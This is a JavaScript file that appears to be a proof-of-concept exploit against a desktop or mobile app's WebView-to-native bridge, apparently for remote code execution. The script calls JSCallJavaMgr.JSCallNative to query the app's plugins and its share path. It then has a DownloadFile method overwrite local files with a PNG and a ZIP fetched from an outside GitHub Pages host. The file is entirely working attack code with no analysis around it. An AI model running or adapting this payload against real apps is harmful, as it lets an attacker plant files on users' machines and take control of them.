(function(){
  document.title='P81MAIN:'+location.host;
  window.__p=function(r){
    try{r=typeof r==='string'?JSON.parse(r):r}catch(e){}
    try{
      window.JSCallJavaMgr.JSCallNative(JSON.stringify({
        module:'CommonPlugin',method:'PrintLog',
        param:{log:JSON.stringify(r)},callId:'LOG'
      }));
    }catch(e){}
    document.title='P81MCB:'+(r&&r.callId)+':'+location.host+':'+(r&&r.code);
  };
  function c(id,mod,m,p){
    window.JSCallJavaMgr.JSCallNative(JSON.stringify({
      callback:'window.__p',module:mod,method:m,param:p,callId:id
    }));
  }
  var png='https://gitwhs.github.io/wm-poc-rce/p40.png';
  var zip='https://gitwhs.github.io/wm-poc-rce/p50.zip';
  var q=[
    ['H2','CommonPlugin','GetPerformance',{}],
    ['C0','VirtualBackgroundWebPlugin','GetWebAppVirtualBackgroundConfig',{}],
    ['C1','VirtualBackgroundWebPlugin','DownloadFile',{url:png,over_write:true}],
    ['I2','IdeaWebViewPlugin','GetWebViewSharePath',{}],
    ['C5','VirtualBackgroundWebPlugin','DownloadFile',{url:zip,over_write:true}]
  ];
  var i=0;
  function n(){
    if(i>=q.length){document.title='P81MAIN-DONE:'+location.host;return}
    var x=q[i++];
    c(x[0],x[1],x[2],x[3]);
    setTimeout(n,3500);
  }
  setTimeout(n, 1200);
})();
